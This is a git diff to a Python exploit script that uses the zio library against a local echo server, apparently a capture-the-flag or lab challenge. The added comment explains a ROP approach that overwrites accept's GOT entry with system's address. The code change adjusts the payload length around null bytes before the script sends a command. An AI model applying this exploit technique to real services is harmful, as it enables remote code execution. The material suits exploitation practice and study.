@@ -1,6 +1,17 @@
 from zio import *
 from struct import pack, unpack
 
+'''
+    a re-echo server
+    we could use recv_line to write the memory, send_len to send the string
+    recv_line(buf) : only take 1 arg, when get '\n' it stops.
+    send_len(buf, n) : send n bytes of datas, easy to use.
+    the typical steps for ROP, overwrite accept's GOT with system's and call it.
+
+    ATTENTION: we should read the echo message of our payload, but the size may not be the length of payload,
+                because the server use sendstr func to send the message, if there is a \0 in payload the string will be cut.
+'''
+
 host = 'localhost'
 port = 1234
 target = (host, port)
@@ -52,6 +63,8 @@ if '\n' in payload:
 if '\x00' in payload:
     print 'there is a 0 in payload, recalculate the length!'
     length = payload.find('\x00')
+else:
+    length = len(payload)
 io.write(payload+'\x00\n')
 io.read(length)
 io.write(cmd)
